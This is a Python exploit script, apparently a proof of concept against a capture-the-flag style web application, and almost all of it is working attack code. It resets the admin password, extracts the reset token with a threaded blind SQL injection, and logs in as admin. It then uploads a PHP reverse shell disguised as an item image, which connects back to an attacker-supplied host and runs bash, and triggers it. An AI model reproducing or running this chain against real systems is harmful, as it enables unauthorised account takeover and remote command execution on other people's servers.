import requests
from concurrent.futures import ThreadPoolExecutor
import string 
import sys 
import re
import os 

BASE_URL = "http://securecode01"
LOGIN_PAGE = "/login/checkLogin.php"
RESET_PASSWORD = "/login/resetPassword.php"
DO_CHANGE_PASSWORD = "/login/doChangePassword.php"
VIEW_ITEM_PAGE = "/item/viewItem.php"
UPDATE_ITEM_PAGE = "/item/updateItem.php"
SCRIPT_DIR = os.path.abspath( os.path.dirname( __file__ ) )
REVSHELL_DIR = SCRIPT_DIR + "/normal.phar"
REVSHELL_UPLOAD_PATH = "/item/image/normal.phar"
SESSION = requests.Session()

# Step 1
def request_reset(username):
    print("[!] Requesting Admin Password Reset...")
    data = {"username": username}
    response = SESSION.post(BASE_URL + RESET_PASSWORD, data=data)
    assert "Success" in response.text, "Reset request did not complete successfully."
# Step 3
def change_password(token, new_password):
    print("[!] Changing admin password using that token.")
    data = {"token": token, "password": new_password}
    response = SESSION.post(BASE_URL + DO_CHANGE_PASSWORD, params=data)
    if "Password Changed" not in response.text:
        return False
    return True

# Step 2
def sqli_exfil_character(session, payload):
    data = {"id": payload}
    response = session.get(BASE_URL + VIEW_ITEM_PAGE, params=data, allow_redirects=False)
    return response.status_code == 404
    
TOKEN_LENGTH = 16
MAX_WORKERS = 100 
def exfiltrate_token(session):
    print("[!] ViewItem SQLi to exfilterate the admin token...")
    def boolean_sqli(arguments):
        idx, ascii_val, session = arguments
        payload = f"-1 OR BINARY CHAR({ord(ascii_val)}) = (SELECT SUBSTRING(token, {idx + 1}, 1) FROM user where id = 1)#"
        return ascii_val, sqli_exfil_character(session, payload)

    result = ""
    # Go through each character position
    for idx in range(TOKEN_LENGTH):
        # Use MAX_WORKERS threads to test possible ASCII values in parallel
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            CHARSET = string.ascii_letters + string.digits
            responses = executor.map(boolean_sqli, [(idx, ascii_val, session) for ascii_val in CHARSET])

        # Go through each response and determine which ASCII value is correct
        for ascii_val, truth in responses:
            if truth:
                result += ascii_val
                break
    
    return result

# Step 4
def login_user(session, username, password):
    success = False
    data = {"username": username, "password": password}
    response = session.post(BASE_URL + LOGIN_PAGE, data=data)
    if "Success" in response.text:
        success = True
        match = re.findall(r"FLAG1: (\w*)?", response.text)
        if(match):
            print(f"[+] Flag1: {match[0]}")
    return success

# Step 5: Create the reverse shell file to be uploaded
def create_rev_shell(HOST, PORT):
    payload = f'<?php $sock=fsockopen("{HOST}",{PORT});$proc=proc_open("/bin/bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
    with open(REVSHELL_DIR, "w") as revshell:
        revshell.write(payload)
    print(f"[+] Reverse Shell Created; The target will connect to {HOST}:{PORT}")
    return True

# Step 6: Update Item
def update_item(session):
    data = {"id": "1", "id_user": "1", "name": "Testing Item", "description": "Description of the test item", "price": "100" }
    file = {"image": ("normal.phar", open(REVSHELL_DIR, "rb"))}
    response = session.post(BASE_URL + UPDATE_ITEM_PAGE, files=file, data=data)

    if "Success" in response.text:
        print(f"[+] Reverse Shell uploaded, find it in {REVSHELL_UPLOAD_PATH}.")
        return True
    return False

# Step 7
def execute_revshell(session):
    print(f"[+] Visiting the page with the payload, check your listener for the shell.")
    response = session.get(BASE_URL + REVSHELL_UPLOAD_PATH)
    assert response.status_code != 404, "Reverse Shell not found"

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("[USAGE] poc.py http://<targetip> <localip> <localport>")
        exit()
    BASE_URL = sys.argv[1]
    HOST = sys.argv[2]
    PORT = sys.argv[3]
    
    username = "admin"
    password = "admin"
    # Request Admin
    request_reset(username)
    print("[+] Admin Password Reset Requested, time to get the token")
    ## Exfiltrate Token
    user_token = exfiltrate_token(SESSION)
    print(f"[+] {username} Token Found: {user_token}")
    ## Change User Password
    if not change_password(user_token, password):
        print("[-] Password Change failed, verify the validity of the token.")
        exit()
    print(f"[+] {username} password changed, New creds => {username}:{password}")
    # Login with new creds
    if not login_user(SESSION, username, password):
        print(f"[-] Could not login with credentials {username}:{password}")
        exit()
    print(f"[+] Login Successful as {username}.")
    create_rev_shell(HOST, PORT)
    update_item(SESSION)
    execute_revshell(SESSION)
